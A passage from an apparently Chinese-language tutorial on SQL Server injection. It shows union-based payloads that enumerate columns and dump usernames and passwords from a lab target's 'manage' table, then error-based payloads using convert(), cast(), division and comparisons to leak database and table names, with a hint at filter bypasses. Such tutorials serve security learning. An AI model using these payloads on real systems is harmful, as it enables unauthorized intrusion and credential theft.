style="color:#999988;font-style:italic">-- password</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 也可用</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">column_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">columns</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> table_name </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;manage&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">column_name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> mozhe_db_v2</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">information_schema</span><span class="token punctuation" style="color:#393A34">.</span><span class="token keyword" style="color:#00009f">columns</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> table_name </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;manage&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223095551325" src="/assets/images/image-20211223095551325-61c3d5c652e27ce33ae437d51c003e7d.png" width="1944" height="222" class="img_ev3q"></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic"># 不支持跨库查询</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">name</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> syscolumns </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> OBJECT_ID</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;manage&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic"># 也可用</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> col_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">object_id</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;manage&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> sysobjects</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> col_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">object_id</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;manage&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> sysobjects</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;3&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223100716469" src="/assets/images/image-20211223100716469-8c0b603d7d2ea27f15a53e76c7af3898.png" width="2266" height="180" class="img_ev3q"></p>
<ul>
<li><strong>查值</strong></li>
</ul>
<p>现在我们已经知道表名、列名了，就可以直接查值了</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> 列名 </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> 表名</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token operator" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">2</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">union</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">all</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">username</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">password</span><span class="token punctuation" style="color:#393A34">,</span><span class="token string" style="color:#e3116c">&#x27;4&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> manage</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="image-20211223100853063" src="/assets/images/image-20211223100853063-da477a277904724729799ac4470a4942.png" width="1944" height="352" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="总结">总结<a href="#总结" class="hash-link" aria-label="总结的直接链接" title="总结的直接链接">​</a></h3>
<p>过程和mysql一模一样，区别就是一些语句的用法差异</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="报错注入">报错注入<a href="#报错注入" class="hash-link" aria-label="报错注入的直接链接" title="报错注入的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="概念-1">概念<a href="#概念-1" class="hash-link" aria-label="概念的直接链接" title="概念的直接链接">​</a></h3>
<p>报错注入通常情况下在服务器开启报错信息返回，也就是发生错误时返回报错信息，通过特殊函数的错误使用使其参数被页面输出。</p>
<p>常见的报错注入出现在类型转换错误的情况下，如给<code>db_name()</code>强制转换为<code>int</code>，就会抛出包含数据库名的异常信息。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="注入举例">注入举例<a href="#注入举例" class="hash-link" aria-label="注入举例的直接链接" title="注入举例的直接链接">​</a></h3>
<blockquote>
<p>没有自己搭环境，抄几张罗总的截图，<strong>谢谢罗总</strong></p>
</blockquote>
<p>语句都和联合注入中一样，只不过替换过来稍作修改即可</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">convert</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/1632281596295-50c7eed6-8681-4dc7-9770-613a9ce6f43f-a6bf5809dded6df91e565e6d7271cf4c.png" width="1303" height="313" class="img_ev3q"></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="报错函数">报错函数<a href="#报错函数" class="hash-link" aria-label="报错函数的直接链接" title="报错函数的直接链接">​</a></h3>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="convert">convert()<a href="#convert" class="hash-link" aria-label="convert()的直接链接" title="convert()的直接链接">​</a></h4>
<p><strong>函数说明：</strong></p>
<p><code>CONVERT()</code>函数是把⽇期转换为新数据类型的通⽤函数。</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">CONVERT</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">data_type</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">length</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> data_to_be_converted</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> style</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/* *</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">注释 ：</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">data_type(length) 转换为⽬标数据类型（带有可选的长度）。</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">data_to_be_converted 含有需要转换的值。</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">style 规定⽇期/时间的输出格式。</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">*/</span><br></span></code></pre></div></div>
<p><strong>报错原理：</strong></p>
<p>对于 <code>convert(int,@@version)</code>，convert 函数⾸先会执⾏第⼆个参数指定的SQL查询，然后尝试将查询结果转换为int类型。但是，由于这个SQL查询的结果是varchar类型，⽆法进⾏指定的转换，所以，convert函数会抛出 ⼀个SQL server错误消息，指出“SQL查询结果”⽆法转换为“int”类型，这样就能得到的这个SQL查询的结果了。</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">convert</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/1632281596295-50c7eed6-8681-4dc7-9770-613a9ce6f43f-a6bf5809dded6df91e565e6d7271cf4c.png" width="1303" height="313" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="cast">cast()<a href="#cast" class="hash-link" aria-label="cast()的直接链接" title="cast()的直接链接">​</a></h4>
<p><strong>函数说明：</strong></p>
<p>此函数将一种数据类型的表达式转换为另一种数据类型。</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">CAST </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> expression </span><span class="token keyword" style="color:#00009f">AS</span><span class="token plain"> data_type </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> length </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/* *</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">expression：任何有效的表达式。</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">data_type：目标数据类型。这包括 xml、bigint 和 sql_variant；不能使用别名数据类型。</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">length：一个可选的整数，用于指定目标数据类型的长度，用于允许用户指定长度的数据类型；默认值为 30。</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">*/</span><br></span></code></pre></div></div>
<p><strong>报错原理：</strong></p>
<p>强制类型转换时，如果类型不匹配将会将数据通过异常的形式抛出</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> cast</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> test</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;users&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">varchar</span><span class="token punctuation" style="color:#393A34">)</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/1632285141790-a359c1a7-2338-4ed2-907f-7ee66e5ed36e-59b887bab0a79d69cac7c090abcc7ac2.png" width="1302" height="314" class="img_ev3q"></p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">SELECT</span><span class="token plain"> cast</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">@version</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">as</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">int</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="除法">除法<a href="#除法" class="hash-link" aria-label="除法的直接链接" title="除法的直接链接">​</a></h4>
<p><strong>说明：</strong></p>
<p>在进行除法运算时，如<code>1/db_name()</code>，会尝试将<code>db_name()</code>转化为<code>int</code>而抛出异常信息(隐式转换)</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token operator" style="color:#393A34">/</span><span class="token plain">db_name</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><br></span></code></pre></div></div>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="--">&gt; &lt; =<a href="#--" class="hash-link" aria-label="&gt; &lt; =的直接链接" title="&gt; &lt; =的直接链接">​</a></h4>
<p><strong>说明：</strong></p>
<p>和上面一样比较时类型转换错误，数字前面也可以加一些其他的运算符，比如<code>~</code>、<code>-</code>等，可能有绕过的作用</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> test</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;users&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> test</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;users&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> users </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> id </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;1&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">select</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">top</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token plain"> name </span><span class="token keyword" style="color:#00009f">from</span><span class="token plain"> test</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">sysobjects </span><span class="token keyword" style="color:#00009f">where</span><span class="token plain"> xtype</span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;u&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">and</span><span class="token plain"> name </span><span class="token operator" style="color:#393A34">not</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">in</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;users&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token comment" style="color:#999988;font-style:italic">--+</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" alt="img" src="/assets/images/1632285397844-2dc99299-081d-44e5-8135-04ec2ee1adcb-e66a1082203fd7f4e4ab926a9da9d64c.png" width="1265" height="298" class="img_ev3q"></p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id="db_name">db_name()<a href="#db_name" class="hash-link" aria-label="db_name()的直接链接" title="db_name()的直接链接">​</a></h4>
<p><strong>函数说明：</strong></p>
<p>此函数返回指定数据库的名称</p>
<div class="language-sql codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-sql codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">DB_NAME </span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> database_id </span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token comment" style="color:#999988;font-style:italic">/* *</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" style="color:#999988;font-style:italic">名称DB_NAME将返回的数据库的标识号 (ID) 。如果调用DB_NAME省略database_id，则DB_NAME返回当前数据库的名称。</span><br></span><span class="token-line" style="color:#393A34"><span class="token comment" 